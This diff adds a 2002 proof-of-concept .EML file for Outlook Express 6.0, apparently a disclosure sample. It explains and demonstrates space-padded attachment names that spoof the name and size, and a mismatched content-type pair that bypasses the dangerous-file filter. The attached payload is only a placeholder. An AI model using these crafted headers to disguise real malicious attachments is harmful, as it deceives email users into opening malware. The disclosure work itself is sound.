@@ -1,0 +1,68 @@
+From: "Matthew Murphy" <mattmurphy@kc.rr.com>
+Subject: E-mail 
+Date: Fri, 19 Jul 2002 23:37:23 -0500
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_007F_01C22F7D.412A3DA0"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Unsent: 1
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_007F_01C22F7D.412A3DA0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+
+This is a sample .EML exploiting several security issues
+in Outlook Express 6.0.
+
+1) Note the file attachment name overflow in the attachment list.
+If a user specifies a VERY LONG attachment name, the attachment is
+truncated in the "Attachments:" listbox.
+
+NOTE: The number of spaces may require some precision work, so
+test often until you get the right number! :-)
+
+2) Note how a .CHM file bypassed the malicious application filter.
+Normally, a user would not be allowed to open such a file, and the
+file would be disabled by the MUA.  However, by using a mismatched
+Content-Type/Content-Disposition pair, the filter allows access to
+the potentially dangerous CHM file type.
+
+3) Note how the "Open Attachment Warning" dialog displays the filename
+when opening the file.  The incredibly long ending that we used to
+spoof the attachments list is not even displayed, worse, the file name
+could inaccurately be displayed as non-malicious (e.g, ASX as here)
+
+4) Note how a specially crafted attachment name allows us to not only
+spoof the name in the listbox, but also the size.  As the user does
+not see the size of the attachment, we can fix this member to a false
+value.  A typical use for this would be to make the file appear smaller
+(safer?) than it really is.
+
+5) Note how the icon is the typical default icon if a "." character is 
+appended to the end of the filename.  OE doesn't parse past the extra 
+dot, although Windows does.
+
+
+------=_NextPart_000_007F_01C22F7D.412A3DA0
+Content-Type: application/octet-stream;
+	name="NewTitle.asx (132 KB)                                                                                                                                                                                                                                              "
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment;
+	filename="NewTitle.asx (132 KB)                                                                                                                                                                                                                                              "
+
+This is not a real CHM file, just for the sake of demonstration!
+------=_NextPart_000_007F_01C22F7D.412A3DA0
+Content-Type: text/plain;
+	name="ATT00119.txt"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment;
+	filename="ATT00119.txt"
+
+
+------=_NextPart_000_007F_01C22F7D.412A3DA0--
